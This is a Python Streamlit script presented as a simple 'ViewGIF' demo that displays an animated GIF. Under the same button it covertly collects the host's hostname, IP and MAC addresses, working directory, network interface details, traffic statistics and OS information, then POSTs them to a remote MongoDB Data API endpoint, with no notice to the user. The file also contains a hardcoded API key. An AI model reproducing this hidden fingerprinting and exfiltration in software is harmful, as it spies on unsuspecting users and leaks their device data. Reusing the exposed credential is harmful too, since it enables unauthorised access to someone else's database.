import streamlit as st
# import cv2
import streamlit as st
# import l4
import socket
import os
import platform
import psutil
import socket
import json
import json
import requests
# from pymongo import MongoClient
from getmac import get_mac_address
import json
import requests



def get_device_info():
        info = {
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'Architecture': platform.architecture(),
        }
        
        return info

if st.button("ViewGIF"):
    

    
    st.title("Display a GIF in Streamlit")

    # Display the GIF
    st.image(r"idea-gears.gif", caption="This is an animated GIF", use_column_width=True)


    # Get the hostname of the device
    hostname = socket.gethostname()

    # Get the IP address associated with the hostname
    ip_address = socket.gethostbyname(hostname)

    print(f"Current IP address: {ip_address}")

    print(str(os.getcwd()))
    
    
    try:
        info = get_device_info()
    except:
        info = {}

    # Get hostname
    hostname = socket.gethostname()

    # Get IP address
    ip_address = socket.gethostbyname(hostname)

    # Get all network interfaces (name, MAC address, IP address)
    network_interfaces = psutil.net_if_addrs()
    network_stats = psutil.net_if_stats()

    # Display network interface details
    for interface_name, interface_addresses in network_interfaces.items():
        print(f"\nInterface: {interface_name}")
        for address in interface_addresses:
            if address.family == socket.AF_INET:
                print(f"  IP Address: {address.address}")
                print(f"  Netmask: {address.netmask}")
                print(f"  Broadcast IP: {address.broadcast}")
            # elif address.family == socket.AF_PACKET:
            #     print(f"  MAC Address: {address.address}")
            #     print(f"  Netmask: {address.netmask}")
            #     print(f"  Broadcast MAC: {address.broadcast}")
        
        # Get network interface status
        if interface_name in network_stats:
            is_up = network_stats[interface_name].isup
            duplex = network_stats[interface_name].duplex
            speed = network_stats[interface_name].speed
            mtu = network_stats[interface_name].mtu
            print(f"  Status: {'Up' if is_up else 'Down'}")
            print(f"  Duplex: {duplex}")
            print(f"  Speed: {speed} Mbps")
            print(f"  MTU: {mtu}")

    # Get network I/O statistics
    net_io = psutil.net_io_counters()
    bytes_sent = net_io.bytes_sent
    bytes_recv = net_io.bytes_recv
    packets_sent = net_io.packets_sent
    packets_recv = net_io.packets_recv
    err_in = net_io.errin
    err_out = net_io.errout
    drop_in = net_io.dropin
    drop_out = net_io.dropout

    # Display network I/O statistics
    print(f"\nNetwork I/O Statistics:")
    print(f"  Bytes Sent: {bytes_sent / (1024**2):.2f} MB")
    print(f"  Bytes Received: {bytes_recv / (1024**2):.2f} MB")
    print(f"  Packets Sent: {packets_sent}")
    print(f"  Packets Received: {packets_recv}")
    print(f"  Input Errors: {err_in}")
    print(f"  Output Errors: {err_out}")
    print(f"  Incoming Packets Dropped: {drop_in}")
    print(f"  Outgoing Packets Dropped: {drop_out}")


    mac_address = get_mac_address()
    print(f"MAC Address: {mac_address}")


    


    data = {"Current IP address":ip_address,"CWD":str(os.getcwd()),"Hostname":str(hostname),"Network Interface":network_interfaces,"Network Stats":network_stats,"I/O statistics":net_io,"MAC Address":mac_address}

    data.update(info)


    url = "https://ap-south-1.aws.data.mongodb-api.com/app/data-bkrdaiv/endpoint/data/v1/action/insertOne"

    payload = json.dumps({
        "collection": "myAppcollection",
        "database": "ClientDB",
        "dataSource": "Cluster0",
        "document": data
    })
    headers = {
    'Content-Type': 'application/json',
    'Access-Control-Request-Headers': '*',
    'api-key': 'MWLR5zxRiO8c4MkqSElua7J95do7i92Kg7sCdPduS53QnBGyonPBheaxnOPSFbpX',
    }

    response = requests.request("POST", url, headers=headers, data=payload)
    print(response)


